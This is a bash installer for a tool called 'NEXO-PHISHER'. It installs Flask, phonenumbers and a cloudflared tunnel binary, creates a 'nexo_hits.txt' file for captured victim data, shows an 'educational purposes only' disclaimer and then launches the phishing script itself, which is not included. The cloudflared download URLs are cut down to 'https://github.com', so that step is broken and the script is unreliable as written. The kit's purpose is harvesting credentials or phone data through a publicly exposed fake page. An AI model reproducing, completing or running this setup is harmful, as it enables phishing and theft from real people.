#!/bin/bash

# --- [ SYSTEM COLORS ] ---
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
C='\033[1;36m'
W='\033[0m'

# --- [ NEXO-TECH AUTOMATED SETUP ] ---
clear
echo -e "${G}[*] Initializing NEXO-PHISHER Environment Setup...${W}"
sleep 1

# 1. Update and Install System Dependencies
echo -e "${Y}[+] Checking for system tools (curl, python3)...${W}"
sleep 1
if [ -x "$(command -v pkg)" ]; then
    # For Termux Users
    pkg update && pkg upgrade -y
    pkg install python python-pip curl wget -y
elif [ -x "$(command -v apt)" ]; then
    # For Linux/Ubuntu Users
    sudo apt update
    sudo apt install python3 python3-pip curl wget -y
fi
sleep 1

# 2. Install Cloudflared (The Tunnel)
echo -e "${Y}[+] Configuring Cloudflared binary...${W}"
sleep 1
if [[ $(uname -m) == "aarch64" || $(uname -m) == "armv7l" ]]; then
    wget https://github.com -O cloudflared
else
    wget https://github.com -O cloudflared
fi
chmod +x cloudflared
mv cloudflared /usr/local/bin/ 2>/dev/null || mv cloudflared $PREFIX/bin/
sleep 1

# 3. Install Python Libraries
echo -e "${Y}[+] Installing Python requirements (Flask, Phonenumbers)...${W}"
sleep 1
pip install flask phonenumbers requests
sleep 1

# 4. Create Project Structure
mkdir -p templates
touch nexo_hits.txt
sleep 1

# --- [ HACKER INTERACTION SECTION ] ---
clear
echo -e "${C}"
sleep 1
echo "HELLO THERE FELLOW HACKER"
sleep 1
echo "THIS TOOL WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES"
sleep 1
echo "AND NOT TO BE USED TO CAUSE HARM"
sleep 1
echo -e "${W}"

# The Y/N Prompt with Red/Green highlights
echo -en "${Y}DO YOU AGREE? (${G}Y${Y}/${R}N${Y}): ${W}"
read choice

if [[ "$choice" == "Y" || "$choice" == "y" ]]; then
    echo -e "${G}"
    sleep 1
    echo "REDIRECTING YOU TO THE MAIN TOOL ....."
    sleep 1
    echo -e "${R}3..."
    sleep 1
    echo -e "${Y}2..."
    sleep 1
    echo -e "${G}1..."
    sleep 1
    echo -e "${W}"
    python3 nexo-phisher.py
else
    echo -e "${R}"
    sleep 1
    echo "EXITING... ACCESS DENIED."
    sleep 1
    echo -e "${W}"
    exit 1
fi
